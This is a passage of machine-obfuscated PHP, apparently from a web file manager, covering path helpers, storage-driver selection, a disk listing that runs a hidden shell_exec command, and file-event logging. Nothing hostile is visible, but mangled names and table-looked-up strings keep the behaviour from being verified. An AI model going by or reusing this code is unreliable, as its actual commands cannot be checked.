(strpos($ÂîäËæÍ, $ª™Ìú£[1363]) > 0) { $ÂîäËæÍ = substr($ÂîäËæÍ, 0, strpos($ÂîäËæÍ, $ª™Ìú£[1363])); } return $ÂîäËæÍ; } public static function sourceID($ˆÔÔÂ¢±) { $Œ‡¶Êü =& $_SERVER[äô®•½Â]; $°™¥è½º = self::parse($ˆÔÔÂ¢±); if ($°™¥è½º[$Œ‡¶Êü[33]] !== self::KOD_SOURCE) { show_json(LNG($Œ‡¶Êü[1364]), !1); } return $°™¥è½º[$Œ‡¶Êü[486]]; } public static function make($ˆ¼Ã«Ãí) { if (!$ˆ¼Ã«Ãí) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ˆ¼Ã«Ãí)); } public static function makeShare($ğııŒ°õ, $—Á¶‡†Ó) { return self::makePath(self::KOD_SHARE_ITEM, $ğııŒ°õ, $—Á¶‡†Ó); } public static function makeFileTypePath($ñ¿÷ãê) { return self::makePath(self::KOD_USER_FILE_TYPE, $ñ¿÷ãê); } public static function makeFileTagPath($÷É¸“Ú’) { return self::makePath(self::KOD_USER_FILE_TAG, $÷É¸“Ú’); } public static function makePath($áÁñ„Åë, $§Î‰‹† = '', $Õå ‰Ö = '') { $­øÊÓÑı =& $_SERVER[äô®•½Â]; $Õ–¨™¸â = substr($áÁñ„Åë, 1, -1); $îø¥ê²Í = $­øÊÓÑı[1365] . $Õ–¨™¸â . $­øÊÓÑı[1366] . $§Î‰‹† . $­øÊÓÑı[1367]; $îø¥ê²Í = $Õå ‰Ö ? $îø¥ê²Í . $Õå ‰Ö . $­øÊÓÑı[8] : $îø¥ê²Í; return $îø¥ê²Í; } public static function hashPath($Õü¡…Öì, $¤òåó®š = false) { $ÈøğÆÃ¦ =& $_SERVER[äô®•½Â]; if (!$Õü¡…Öì) { return $ÈøğÆÃ¦[12]; } $İ½¿Ê£Ã = is_array($Õü¡…Öì) ? $Õü¡…Öì : IO::info($Õü¡…Öì); $ÑÂ·È‘Â = _get($İ½¿Ê£Ã, $ÈøğÆÃ¦[1368], $ÈøğÆÃ¦[12]); if (!$ÑÂ·È‘Â && isset($İ½¿Ê£Ã[$ÈøğÆÃ¦[554]])) { $ÑÂ·È‘Â = $İ½¿Ê£Ã[$ÈøğÆÃ¦[554]]; } if (!$ÑÂ·È‘Â && isset($İ½¿Ê£Ã[$ÈøğÆÃ¦[238]])) { $ÑÂ·È‘Â = trim($İ½¿Ê£Ã[$ÈøğÆÃ¦[238]], $ÈøğÆÃ¦[121]); } if ($ÑÂ·È‘Â) { return $ÑÂ·È‘Â; } if (!$ÑÂ·È‘Â && isset($İ½¿Ê£Ã[$ÈøğÆÃ¦[194]]) && $İ½¿Ê£Ã[$ÈøğÆÃ¦[194]]) { $İ½¿Ê£Ã = IO::info(KodIO::make($İ½¿Ê£Ã[$ÈøğÆÃ¦[194]])); $ÑÂ·È‘Â = _get($İ½¿Ê£Ã, $ÈøğÆÃ¦[1368], $ÈøğÆÃ¦[12]); if (!$ÑÂ·È‘Â && isset($İ½¿Ê£Ã[$ÈøğÆÃ¦[554]])) { $ÑÂ·È‘Â = $İ½¿Ê£Ã[$ÈøğÆÃ¦[554]]; } } $Ğ…İ¥ñ = md5($İ½¿Ê£Ã[$ÈøğÆÃ¦[87]] . $İ½¿Ê£Ã[$ÈøğÆÃ¦[79]] . $İ½¿Ê£Ã[$ÈøğÆÃ¦[88]]); $êí÷ÎÎ¾ = $Ğ…İ¥ñ . $ÈøğÆÃ¦[1369]; $ÑÂ·È‘Â = $ÑÂ·È‘Â ? $ÑÂ·È‘Â : Cache::get($êí÷ÎÎ¾); if (!$ÑÂ·È‘Â && $¤òåó®š) { $ÑÂ·È‘Â = IO::hashSimple($İ½¿Ê£Ã[$ÈøğÆÃ¦[87]]); Cache::set($êí÷ÎÎ¾, $ÑÂ·È‘Â ? $ÑÂ·È‘Â : $Ğ…İ¥ñ, 3600 * 24 * 30); } return $ÑÂ·È‘Â ? $ÑÂ·È‘Â : $Ğ…İ¥ñ; } public static function hashPathSafe($¯© Í, $Î ßáÏ = false) { $èö×çÕß =& $_SERVER[äô®•½Â]; $â™î’Æª = self::hashPath($¯© Í, $Î ßáÏ); return md5($â™î’Æª . $èö×çÕß[1370] . Model($èö×çÕß[836])->get($èö×çÕß[837])); } public static function initSystemPath() { $¶™ÀÃ¥á =& $_SERVER[äô®•½Â]; if (defined($¶™ÀÃ¥á[1371])) { return; } define($¶™ÀÃ¥á[1371], self::systemPath($¶™ÀÃ¥á[192])); define($¶™ÀÃ¥á[1372], self::systemPath($¶™ÀÃ¥á[1373])); define($¶™ÀÃ¥á[1374], self::systemPath($¶™ÀÃ¥á[1375])); define($¶™ÀÃ¥á[1376], self::systemPath($¶™ÀÃ¥á[1377])); IOHistory::bindEvent(); } public static function systemPath($ª˜’²¬é) { $ÜÕµŞöç =& $_SERVER[äô®•½Â]; $ª÷¤ÁÜ = $ÜÕµŞöç[1378] . ucfirst($ª˜’²¬é); $ Ò€ñø– = Model($ÜÕµŞöç[836])->get($ª÷¤ÁÜ); if ($ Ò€ñø–) { return $ Ò€ñø–; } if ($ª˜’²¬é == $ÜÕµŞöç[192]) { $ Ò€ñø– = self::make(Model($ÜÕµŞöç[896])->systemRootPathAdd($ÜÕµŞöç[621])); } else { $ Ò€ñø– = self::systemPath($ÜÕµŞöç[192]); $¨Ñêó‘± = self::sourceID($ Ò€ñø–); $ Ò€ñø– = self::make(Model($ÜÕµŞöç[896])->mkdir($¨Ñêó‘±, $ª˜’²¬é)); } Model($ÜÕµŞöç[836])->set($ª÷¤ÁÜ, $ Ò€ñø–); return $ Ò€ñø–; } public static function systemFolder($¦‰ëô™ã) { $ÂÃÀ¥–‡ = IO_PATH_SYSTEM_SOURCE . $¦‰ëô™ã; $²»‹Š±™ = Cache::get($ÂÃÀ¥–‡); if (!$²»‹Š±™) { $‰¹†œÜ¾ = IO::infoFullSimple($ÂÃÀ¥–‡); if (!$‰¹†œÜ¾) { $²»‹Š±™ = IO::mkdir($ÂÃÀ¥–‡, REPEAT_SKIP); } else { $²»‹Š±™ = $‰¹†œÜ¾[$_SERVER[äô®•½Â][87]]; } Cache::set($ÂÃÀ¥–‡, $²»‹Š±™, 3600 * 10); } return $²»‹Š±™; } public static function defaultDriver() { return Model($_SERVER[äô®•½Â][833])->defaultDriver(); } public static function defaultDriverInit() { $ùóÄ›« =& $_SERVER[äô®•½Â]; static $•˜Æ©®Ô = false; if ($•˜Æ©®Ô) { return $•˜Æ©®Ô; } $ê¥õàô÷ = self::defaultDriver(); $•˜Æ©®Ô = IO::init($ùóÄ›«[1379] . $ê¥õàô÷[$ùóÄ›«[486]] . $ùóÄ›«[1367]); return $•˜Æ©®Ô; } public static function fileTypeList() { $å´ï®ô† =& $_SERVER[äô®•½Â]; $ïò‹å«· = $GLOBALS[$å´ï®ô†[6]][$å´ï®ô†[1380]]; foreach ($ïò‹å«· as $ë¿„›ş => $™Úª±) { $’¥²Ÿ»¸ = $å´ï®ô†[1381] . $ë¿„›ş; $Á¾¢…—Ã = LNG($’¥²Ÿ»¸); if ($’¥²Ÿ»¸ != $Á¾¢…—Ã) { $ïò‹å«·[$ë¿„›ş][$å´ï®ô†[32]] = $Á¾¢…—Ã; } } return $ïò‹å«·; } public static function ioFileDriverGet($ºïÇÙ²× = '') { $øÕ¨áãÔ =& $_SERVER[äô®•½Â]; static $’ëŒŸÅÍ = array(); static $È¿Ó“Óİ = array(); static $Ñ÷…Š€¬ = array(); static $ŸîÑİº = false; if ($ŸîÑİº === !1) { $ŸîÑİº = array($øÕ¨áãÔ[591] => array(), $øÕ¨áãÔ[678] => array()); $Ú¡ÄÈ´Ø = Model($øÕ¨áãÔ[1382])->get(!1, $øÕ¨áãÔ[1383]); foreach ($Ú¡ÄÈ´Ø as $ˆ—ÁË©ö => $‰·ãéÌá) { if (!$‰·ãéÌá || $‰·ãéÌá == $øÕ¨áãÔ[12]) { continue; } if (strstr($ˆ—ÁË©ö, $øÕ¨áãÔ[1384])) { $úÁÕé·ª = str_replace($øÕ¨áãÔ[1384], $øÕ¨áãÔ[12], $ˆ—ÁË©ö); $ŸîÑİº[$øÕ¨áãÔ[591]][$úÁÕé·ª] = $‰·ãéÌá; } else { if (strstr($ˆ—ÁË©ö, $øÕ¨áãÔ[1385])) { $úÁÕé·ª = str_replace($øÕ¨áãÔ[1385], $øÕ¨áãÔ[12], $ˆ—ÁË©ö); $ŸîÑİº[$øÕ¨áãÔ[678]][$úÁÕé·ª] = $‰·ãéÌá; } } } } $’‡¬œ‰ = self::defaultDriver(); if (!$ºïÇÙ²× || !$ŸîÑİº[$øÕ¨áãÔ[591]] && !$ŸîÑİº[$øÕ¨áãÔ[678]]) { return $’‡¬œ‰; } $íú…±òÚ = self::getPathSourceID($ºïÇÙ²×); if (!$íú…±òÚ) { return $’‡¬œ‰; } if (isset($’ëŒŸÅÍ[$íú…±òÚ])) { return $’ëŒŸÅÍ[$íú…±òÚ]; } $û´åç„ı = Model($øÕ¨áãÔ[896])->sourceInfo($íú…±òÚ); $¾¸Úöì = $û´åç„ı[$øÕ¨áãÔ[582]]; $Âñûş¨ì = array(); if (!$û´åç„ı) { return $’‡¬œ‰; } if ($û´åç„ı[$øÕ¨áãÔ[191]] == $øÕ¨áãÔ[91]) { if (isset($Ñ÷…Š€¬[$¾¸Úöì])) { return $Ñ÷…Š€¬[$¾¸Úöì]; } if (isset($ŸîÑİº[$øÕ¨áãÔ[678]][$¾¸Úöì])) { $Şü†Ş” = Model($øÕ¨áãÔ[833])->driverInfo($ŸîÑİº[$øÕ¨áãÔ[678]][$¾¸Úöì]); $’‡¬œ‰ = $Şü†Ş” ? $Şü†Ş” : $’‡¬œ‰; $Ñ÷…Š€¬[$¾¸Úöì] = $’‡¬œ‰; $’ëŒŸÅÍ[$íú…±òÚ] = $’‡¬œ‰; return $’‡¬œ‰; } $Âñûş¨ì = self::groupParentUser($¾¸Úöì); } else { if ($û´åç„ı[$øÕ¨áãÔ[191]] == $øÕ¨áãÔ[521]) { $˜°³„ = Model($øÕ¨áãÔ[1386])->getInfo($¾¸Úöì); if ($˜°³„) { $Âñûş¨ì = explode($øÕ¨áãÔ[50], trim($˜°³„[$øÕ¨áãÔ[597]], $øÕ¨áãÔ[50])); $Âñûş¨ì = array_remove_value($Âñûş¨ì, $øÕ¨áãÔ[231]); $Âñûş¨ì[] = $¾¸Úöì; $Âñûş¨ì = array_reverse($Âñûş¨ì); } } } foreach ($Âñûş¨ì as $ˆñ•‡ìª) { if (!isset($ŸîÑİº[$øÕ¨áãÔ[591]][$ˆñ•‡ìª])) { continue; } if (isset($È¿Ó“Óİ[$ˆñ•‡ìª])) { return $È¿Ó“Óİ[$ˆñ•‡ìª]; } $Şü†Ş” = Model($øÕ¨áãÔ[833])->driverInfo($ŸîÑİº[$øÕ¨áãÔ[591]][$ˆñ•‡ìª]); $’‡¬œ‰ = $Şü†Ş” ? $Şü†Ş” : $’‡¬œ‰; $È¿Ó“Óİ[$ˆñ•‡ìª] = $’‡¬œ‰; break; } if ($û´åç„ı[$øÕ¨áãÔ[191]] == $øÕ¨áãÔ[91]) { $Ñ÷…Š€¬[$¾¸Úöì] = $’‡¬œ‰; } $’ëŒŸÅÍ[$íú…±òÚ] = $’‡¬œ‰; return $’‡¬œ‰; } private static function getPathSourceID($¥ãŠÂ½Â) { $Àı­ºÄä =& $_SERVER[äô®•½Â]; static $§ÛíİğÃ = array(); if (!$¥ãŠÂ½Â) { return $Àı­ºÄä[12]; } $Û°Àâ± = substr($¥ãŠÂ½Â, 0, strlen($Àı­ºÄä[494])) == $Àı­ºÄä[494]; $ñÌ•åÙæ = substr($¥ãŠÂ½Â, 0, strlen($Àı­ºÄä[1354])) == $Àı­ºÄä[1354]; $Î‚´Ü = substr($¥ãŠÂ½Â, 0, strlen($Àı­ºÄä[1355])) == $Àı­ºÄä[1355]; if (!$Û°Àâ± && !$ñÌ•åÙæ && !$Î‚´Ü) { return $Àı­ºÄä[12]; } $²šŸ”İ› = self::parse($¥ãŠÂ½Â); $„í´æÜ = $²šŸ”İ›[$Àı­ºÄä[1248]]; if ($Û°Àâ±) { return $²šŸ”İ›[$Àı­ºÄä[486]]; } if (isset($§ÛíİğÃ[$„í´æÜ])) { $§Ò½ñ» = $§ÛíİğÃ[$„í´æÜ]; } else { $§Ò½ñ» = IO::init($„í´æÜ); $§ÛíİğÃ[$„í´æÜ] = $§Ò½ñ»; } if (isset($§Ò½ñ»->pathParse[$Àı­ºÄä[1251]])) { return $§Ò½ñ»->pathParse[$Àı­ºÄä[1251]]; } return $Àı­ºÄä[12]; } private static function groupParentUser($ÕşŠ‚é) { $³¨Ú¢Š =& $_SERVER[äô®•½Â]; $ŞÈ±Ãïª = Model($³¨Ú¢Š[610])->getInfo($ÕşŠ‚é); if (!$ŞÈ±Ãïª) { return array(); } $ÒÔ…Äô = array_to_keyvalue($ŞÈ±Ãïª[$³¨Ú¢Š[1387]], $³¨Ú¢Š[12], $³¨Ú¢Š[1388]); $¼ıŠÍí² = array(); foreach ($ŞÈ±Ãïª[$³¨Ú¢Š[1387]] as $‚‹ÁÎñ) { $¼ıŠÍí²[] = $‚‹ÁÎñ[$³¨Ú¢Š[1388]]; $œÁâ› = explode($³¨Ú¢Š[50], trim($‚‹ÁÎñ[$³¨Ú¢Š[597]], $³¨Ú¢Š[50])); $œÁâ› = array_remove_value($œÁâ›, $³¨Ú¢Š[231]); $œÁâ› = array_reverse($œÁâ›); $¼ıŠÍí² = array_merge($¼ıŠÍí², $œÁâ›); } return array_unique($¼ıŠÍí²); } public static function diskList($‡ß‡Ş = true) { $•Äüç¢ü = $_SERVER[äô®•½Â][1389]; if ($‡ß‡Ş) { $»¿ÂèÜŠ = Cache::get($•Äüç¢ü); if (is_array($»¿ÂèÜŠ)) { return $»¿ÂèÜŠ; } } $»¿ÂèÜŠ = self::diskListGet(); Cache::set($•Äüç¢ü, $»¿ÂèÜŠ, 60); return $»¿ÂèÜŠ; } public static function diskListGet() { $ËÀ²±­Í =& $_SERVER[äô®•½Â]; $˜µ¦§ñ¤ = array(); if ($GLOBALS[$ËÀ²±­Í[6]][$ËÀ²±­Í[1390]] == $ËÀ²±­Í[1391]) { $»ßêÓ‚ƒ = $ËÀ²±­Í[1392]; for ($£â˜Á½ = 0; $£â˜Á½ < strlen($»ßêÓ‚ƒ); $£â˜Á½++) { $ùß¹îë = $»ßêÓ‚ƒ[$£â˜Á½] . $ËÀ²±­Í[1393]; if (file_exists($ùß¹îë)) { $˜µ¦§ñ¤[] = $ùß¹îë; } } return $˜µ¦§ñ¤; } if (!function_exists($ËÀ²±­Í[101])) { $˜µ¦§ñ¤[] = $ËÀ²±­Í[907]; return $˜µ¦§ñ¤; } $Ã¿‚ôş‚ = explode($ËÀ²±­Í[288], shell_exec($ËÀ²±­Í[1394])); array_shift($Ã¿‚ôş‚); array_pop($Ã¿‚ôş‚); $˜™¥¢ÎŠ = array($ËÀ²±­Í[1395], $ËÀ²±­Í[1396], $ËÀ²±­Í[1397], $ËÀ²±­Í[1398], $ËÀ²±­Í[1399], $ËÀ²±­Í[1400], $ËÀ²±­Í[1401], $ËÀ²±­Í[1402]); foreach ($Ã¿‚ôş‚ as $÷Ì©Šİ») { $šŠ™Æµê = preg_split($ËÀ²±­Í[1403], $÷Ì©Šİ»); $ùß¹îë = $šŠ™Æµê[count($šŠ™Æµê) - 1]; if (!strstr($šŠ™Æµê[0], $ËÀ²±­Í[1404]) || !$ùß¹îë) { continue; } $¢•„Í  = rtrim($ùß¹îë, $ËÀ²±­Í[8]) . $ËÀ²±­Í[8]; if (in_array($¢•„Í , $˜™¥¢ÎŠ)) { continue; } $˜µ¦§ñ¤[] = $¢•„Í ; } return $˜µ¦§ñ¤; } public static function isSameDisk($ÕËªŒ, $ÄÒ®Šˆ ) { $Â­ï¬îá =& $_SERVER[äô®•½Â]; if ($GLOBALS[$Â­ï¬îá[6]][$Â­ï¬îá[1390]] == $Â­ï¬îá[1391]) { return strtolower(substr($ÕËªŒ, 0, 1)) == strtolower(substr($ÄÒ®Šˆ , 0, 1)); } $²ÍñÌê½ = stat($ÕËªŒ); $Ü©Ú™†¡ = stat($ÄÒ®Šˆ ); if ($²ÍñÌê½ === !1 || $Ü©Ú™†¡ === !1) { return !1; } return $²ÍñÌê½[$Â­ï¬îá[1405]] === $Ü©Ú™†¡[$Â­ï¬îá[1405]]; $”İí÷‹å = self::diskList(); $à˜üÛ§æ = !1; $”¾÷¤”š = !1; sort($”İí÷‹å); $”İí÷‹å = array_reverse($”İí÷‹å); $ÕËªŒ = rtrim($ÕËªŒ, $Â­ï¬îá[8]) . $Â­ï¬îá[8]; $ÄÒ®Šˆ  = rtrim($ÄÒ®Šˆ , $Â­ï¬îá[8]) . $Â­ï¬îá[8]; foreach ($”İí÷‹å as $˜„±ƒ¢¦) { $ÇÚÌóÂ³ = strlen($˜„±ƒ¢¦); if (!$à˜üÛ§æ && substr($ÕËªŒ, 0, $ÇÚÌóÂ³) == $˜„±ƒ¢¦) { $à˜üÛ§æ = $˜„±ƒ¢¦; } if (!$”¾÷¤”š && substr($ÄÒ®Šˆ , 0, $ÇÚÌóÂ³) == $˜„±ƒ¢¦) { $”¾÷¤”š = $˜„±ƒ¢¦; } if ($à˜üÛ§æ && $”¾÷¤”š) { break; } } return $à˜üÛ§æ === $”¾÷¤”š; } public static function transferType($ß‚²…—«, $ÕÂšÂ) { $¿¸ÚÉÆ =& $_SERVER[äô®•½Â]; $—¦…èİ½ = self::driverType($ß‚²…—«); $ìÙïïÑê = self::driverType($ÕÂšÂ); if ($—¦…èİ½[$¿¸ÚÉÆ[33]] == $ìÙïïÑê[$¿¸ÚÉÆ[33]] && $—¦…èİ½[$¿¸ÚÉÆ[1406]] == $ìÙïïÑê[$¿¸ÚÉÆ[1406]]) { return $¿¸ÚÉÆ[1407]; } if ($—¦…èİ½[$¿¸ÚÉÆ[33]] == $¿¸ÚÉÆ[941] && $ìÙïïÑê[$¿¸ÚÉÆ[33]] == $¿¸ÚÉÆ[109]) { return $¿¸ÚÉÆ[1277]; } if ($—¦…èİ½[$¿¸ÚÉÆ[33]] == $¿¸ÚÉÆ[109] && $ìÙïïÑê[$¿¸ÚÉÆ[33]] == $¿¸ÚÉÆ[941]) { return $¿¸ÚÉÆ[110]; } return $¿¸ÚÉÆ[1408]; } public static function driverType($ÀúŞ) { $áè›ñ˜Ì =& $_SERVER[äô®•½Â]; $ïœ‰é·ß = str_replace($áè›ñ˜Ì[1409], $áè›ñ˜Ì[12], strtolower($ÀúŞ->getType())); if ($ïœ‰é·ß == $áè›ñ˜Ì[823] || $ïœ‰é·ß == $áè›ñ˜Ì[1410] || $ïœ‰é·ß == $áè›ñ˜Ì[1411]) { $…ºĞ‰ Ô = self::ioFileDriverGet($áè›ñ˜Ì[494] . $ÀúŞ->pathParse[$áè›ñ˜Ì[1251]] . $áè›ñ˜Ì[413]); $ÀúŞ = IO::init($áè›ñ˜Ì[1379] . $…ºĞ‰ Ô[$áè›ñ˜Ì[486]] . $áè›ñ˜Ì[1367]); } else { if ($ïœ‰é·ß == $áè›ñ˜Ì[1287] || $ïœ‰é·ß == $áè›ñ˜Ì[1412]) { $ÀúŞ = IO::init($ÀúŞ->pathParse[$áè›ñ˜Ì[1228]]); } } $ˆÉ»£Ô = $ÀúŞ->path; $ïœ‰é·ß = str_replace($áè›ñ˜Ì[1409], $áè›ñ˜Ì[12], strtolower($ÀúŞ->getType())); if ($ïœ‰é·ß == $áè›ñ˜Ì[109]) { return array($áè›ñ˜Ì[33] => $áè›ñ˜Ì[109], $áè›ñ˜Ì[1406] => $áè›ñ˜Ì[12], $áè›ñ˜Ì[87] => $ˆÉ»£Ô, $áè›ñ˜Ì[98] => $ÀúŞ); } return array($áè›ñ˜Ì[33] => $áè›ñ˜Ì[941], $áè›ñ˜Ì[1406] => $ÀúŞ->pathDriver, $áè›ñ˜Ì[87] => $ˆÉ»£Ô, $áè›ñ˜Ì[98] => $ÀúŞ); } public static function pathDriverType($ßŞëİ˜±) { return $ßŞëİ˜± ? self::driverType(IO::init($ßŞëİ˜±)) : !1; } public static function pathDriverLocal($¸èôÉ) { $äÔ¥ñù =& $_SERVER[äô®•½Â]; $¯ãƒ÷¯“ = $¸èôÉ ? self::driverType(IO::init($¸èôÉ)) : !1; return strtolower($¯ãƒ÷¯“[$äÔ¥ñù[33]]) == $äÔ¥ñù[109] ? !0 : !1; } public static function allowCover($„‚š…¦£, $à¸ÕÖÇ = true) { $”Š¸Õ®¸ =& $_SERVER[äô®•½Â]; if (is_string($„‚š…¦£)) { $„‚š…¦£ = IO::info($„‚š…¦£); } if (!$„‚š…¦£ || $„‚š…¦£[$”Š¸Õ®¸[33]] == $”Š¸Õ®¸[78] || $„‚š…¦£[$”Š¸Õ®¸[79]] <= 100) { return !1; } if (isset($„‚š…¦£[$”Š¸Õ®¸[1413]]) || !$„‚š…¦£[$”Š¸Õ®¸[87]]) { return !1; } if (isset($„‚š…¦£[$”Š¸Õ®¸[235]]) && !$„‚š…¦£[$”Š¸Õ®¸[235]]) { return !1; } static $¼­ÃØ·î = false; if (!$¼­ÃØ·î || !$à¸ÕÖÇ) { $ÈÉÆ®†ß = self::driverType(IO::init($„‚š…¦£[$”Š¸Õ®¸[87]])); $©©×ßä´ = $ÈÉÆ®†ß[$”Š¸Õ®¸[98]]; $¼­ÃØ·î = $”Š¸Õ®¸[197]; if ($ÈÉÆ®†ß[$”Š¸Õ®¸[33]] == $”Š¸Õ®¸[109]) { $¼­ÃØ·î = $”Š¸Õ®¸[1414]; } if ($ÈÉÆ®†ß[$”Š¸Õ®¸[98]] && is_array($ÈÉÆ®†ß[$”Š¸Õ®¸[98]]->config)) { $À°µ«À = $ÈÉÆ®†ß[$”Š¸Õ®¸[98]]->config; if (isset($À°µ«À[$”Š¸Õ®¸[1415]]) && $À°µ«À[$”Š¸Õ®¸[1415]]) { $¼­ÃØ·î = $”Š¸Õ®¸[1414]; } } $‰¨Üµ…Ë = KodIO::defaultDriver(); if (strtolower($‰¨Üµ…Ë[$”Š¸Õ®¸[98]]) == $”Š¸Õ®¸[109] && is_array($‰¨Üµ…Ë[$”Š¸Õ®¸[6]])) { $†©Éà”¾ = $‰¨Üµ…Ë[$”Š¸Õ®¸[6]][$”Š¸Õ®¸[1260]]; if (substr($†©Éà”¾, 0, 2) == $”Š¸Õ®¸[1416]) { $†©Éà”¾ = str_replace($”Š¸Õ®¸[1416], BASIC_PATH, $†©Éà”¾); } $†©Éà”¾ = str_replace($”Š¸Õ®¸[257], $”Š¸Õ®¸[8], $†©Éà”¾); if (substr($„‚š…¦£[$”Š¸Õ®¸[87]], 0, strlen($†©Éà”¾)) == $†©Éà”¾) { $¼­ÃØ·î = $”Š¸Õ®¸[197]; } } } return $¼­ÃØ·î == $”Š¸Õ®¸[1414] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($æÓ—õ÷) { parent::__construct($æÓ—õ÷); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto aê¦ÚŸ²ŸË; c¡“Ö²©Ë™: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\143\x65\x5f\145\x76\145\156\x74"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\x69\x6d\145", "\164\x69\155\145", "\x69\x6e\x73\145\162\164", "\146\165\156\x63\x74\151\157\156"), array("\x64\145\x73\143", '', "\151\156\x73\145\x72\x74\54\x75\x70\144\x61\x74\145\54\x73\145\154\x65\x63\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($€½ŞËïä, $Ñ©œÓÌ†, $’¢§ƒ¼´ = '') { $§ È°Ù½ =& $_SERVER[äô®•½Â]; if (!$this->eventSave) { return; } $“Ãı—Àœ = Model($§ È°Ù½[1426])->sourceInfo($€½ŞËïä); if (!$“Ãı—Àœ) { return !1; } if ($this->isDisableEvent($“Ãı—Àœ, $Ñ©œÓÌ†)) { return; } if ($’¢§ƒ¼´ && is_string($’¢§ƒ¼´)) { $’¢§ƒ¼´ = array($§ È°Ù½[2016] => $’¢§ƒ¼´); } $Ò¶÷à¨´ = defined($§ È°Ù½[2208]) ? USER_ID : 0; $Ş‰¦ÉÊ = array($§ È°Ù½[502] => $€½ŞËïä, $§ È°Ù½[2209] => $“Ãı—Àœ[$§ È°Ù½[193]], $§ È°Ù½[2210] => $“Ãı—Àœ[$§ È°Ù½[32]], $§ È°Ù½[595] => !empty($“Ãı—Àœ[$§ È°Ù½[595]]) ? $“Ãı—Àœ[$§ È°Ù½[595]] : $§ È°Ù½[12], $§ È°Ù½[1768] => $Ò¶÷à¨´, $§ È°Ù½[507] => $Ñ©œÓÌ†, $§ È°Ù½[1770] => $’¢§ƒ¼´); $this->addSystemLog($Ñ©œÓÌ†, $Ş‰¦ÉÊ); unset($Ş‰¦ÉÊ[$§ È°Ù½[2210]], $Ş‰¦ÉÊ[$§ È°Ù½[595]]); return $this->add($Ş‰¦ÉÊ); } private function addSystemLog($Å¸äŞ¦ë, $§Â¯şÍ§) { $üÀƒÑ¿º =& $_SERVER[äô®•½Â]; if ($Å¸äŞ¦ë == $üÀƒÑ¿º[2211]) { $Å¸äŞ¦ë = $§Â¯şÍ§[$üÀƒÑ¿º[537]][$üÀƒÑ¿º[2212]]; } else { if (in_array($Å¸äŞ¦ë, array($üÀƒÑ¿º[1957], $üÀƒÑ¿º[2213]))) { $Å¸äŞ¦ë = $§Â¯şÍ§[$üÀƒÑ¿º[537]][$üÀƒÑ¿º[171]]; } } $¿­ÇéÄ‚ = array_merge($§Â¯şÍ§, array($üÀƒÑ¿º[2214] => $§Â¯şÍ§[$üÀƒÑ¿º[194]], $üÀƒÑ¿º[2215] => $§Â¯şÍ§[$üÀƒÑ¿º[2215]])); Hook::trigger($üÀƒÑ¿º[2216], $üÀƒÑ¿º[2217] . $Å¸äŞ¦ë, $§Â¯şÍ§); Model($üÀƒÑ¿º[1922])->addLog($üÀƒÑ¿º[2217] . $Å¸äŞ¦ë, $¿­ÇéÄ‚); } private function isDisableEvent($ŸèŸè„, $ıÀºæÂú) { $ŒÈÇ—ù =& $_SERVER[äô®•½Â]; if ($ŸèŸè„[$ŒÈÇ—ù[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ıÀºæÂú == $ŒÈÇ—ù[1225]) { return !1; } return !0; } public function eventCreate($Ğğ”˜“ˆ, $ºÉ˜’Œ) { $—Ë¼é£¥ =& $_SERVER[äô®•½Â]; $Ä“˜ç—Û = Model($—Ë¼é£¥[1426])->sourceInfo($Ğğ”˜“ˆ); $„‹‰º¦ = array($—Ë¼é£¥[2212] => $ºÉ˜’Œ, $—Ë¼é£¥[32] => $Ä“˜ç—Û[$—Ë¼é£¥[32]]); return $this->addEvent($Ğğ”˜“ˆ, $—Ë¼é£¥[2211], $„‹‰º¦); } public function eventFileEdit($µ˜Çê•Î) { $»Ùµîöî =& $_SERVER[äô®•½Â]; $Ó°¾Ö = array($»Ùµîöî[2218] => $_SERVER[$»Ùµîöî[2219]], $»Ùµîöî[2220] => strtolower(ACTION)); if (isset($GLOBALS[$»Ùµîöî[7]][$»Ùµîöî[2221]])) { $Ó°¾Ö[$»Ùµîöî[2221]] = $»Ùµîöî[91]; } return $this->addEvent($µ˜Çê•Î, $»Ùµîöî[1947], $Ó°¾Ö); } public function eventRecycle($ìî„Ş«›, $œÆŞİ•˜) { return $this->addEvent($ìî„Ş«›, $_SERVER[äô®•½Â][2213], $œÆŞİ•˜); } private static $_removeLast = ''; public function eventRemove($æ´ÀÑÅô) { $Ú§šü® =& $_SERVER[äô®•½Â]; self::$_removeLast = $æ´ÀÑÅô; $¼—¸ŠÓŠ = Model($Ú§šü®[1426])->sourceInfo($æ´ÀÑÅô); $øÔŠà = array_field_key($¼—¸ŠÓŠ, array($Ú§šü®[194], $Ú§šü®[554], $Ú§šü®[516], $Ú§šü®[597])); $¦Ş’â¬Ó = array($Ú§šü®[171] => $¼—¸ŠÓŠ[$Ú§šü®[32]], $Ú§šü®[2220] => ACTION, $Ú§šü®[2222] => $øÔŠà); return $this->addEvent($¼—¸ŠÓŠ[$Ú§šü®[193]], $Ú§šü®[1225], $¦Ş’â¬Ó); } public function eventShare($œÚì»ƒ, $–‚§´…“) { return $this->addEvent($œÚì»ƒ, $_SERVER[äô®•½Â][1957], $–‚§´…“); } public function eventMove($ÍÀÒş´, $Šˆıñ¨, $š™ğŒüÒ) { $°Ì”€ÉÈ =& $_SERVER[äô®•½Â]; if (self::$_removeLast == $ÍÀÒş´) { return; } $ˆ—ëÏšı = Model($°Ì”€ÉÈ[1426]); $Ïå™õ¼² = $ˆ—ëÏšı->sourceInfo($ÍÀÒş´); $‡ë´¿ŠŸ = $ˆ—ëÏšı->sourceInfo($Šˆıñ¨); $åù‰±¶ë = $ˆ—ëÏšı->sourceInfo($š™ğŒüÒ); $ºˆ« œ = array($°Ì”€ÉÈ[1237] => $Šˆıñ¨, $°Ì”€ÉÈ[2223] => $‡ë´¿ŠŸ[$°Ì”€ÉÈ[32]], $°Ì”€ÉÈ[2199] => !empty($‡ë´¿ŠŸ[$°Ì”€ÉÈ[595]]) ? $‡ë´¿ŠŸ[$°Ì”€ÉÈ[595]] : $°Ì”€ÉÈ[12], $°Ì”€ÉÈ[1238] => $š™ğŒüÒ, $°Ì”€ÉÈ[2224] => $åù‰±¶ë[$°Ì”€ÉÈ[32]], $°Ì”€ÉÈ[2225] => !empty($åù‰±¶ë[$°Ì”€ÉÈ[595]]) ? 